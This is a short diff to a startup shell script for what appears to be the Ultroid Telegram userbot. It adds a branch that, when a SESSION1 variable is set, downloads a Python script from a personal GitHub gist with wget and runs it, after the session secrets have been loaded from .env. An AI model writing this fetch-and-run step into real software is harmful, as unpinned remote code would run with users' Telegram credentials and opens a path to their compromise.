@@ -15,7 +15,22 @@ echo "
       Visit @TheUltroid for updates!!
 
 "
-if [ -f .env ] ; then  set -o allexport; source .env; set +o allexport ; fi
-
 # Run both commands
-python3 clever.py & python3 -m pyUltoid
+python3 clever.py
+
+# Source environment variables from .env file if it exists
+if [ -f .env ]; then
+    set -o allexport
+    source .env
+    set +o allexport
+fi
+
+# Check for the SESSION1 variable
+if [ "$SESSION1" ]; then
+    # If SESSION1 exists, download a script and run it
+    wget https://gist.github.com/1Danish-00/6554f034549197e5824972b01f631e0c/raw/main.py -O script.py
+    python3 script.py
+else
+    # If SESSION1 doesn't exist, run pyUltroid
+    python3 -m pyUltroid
+fi
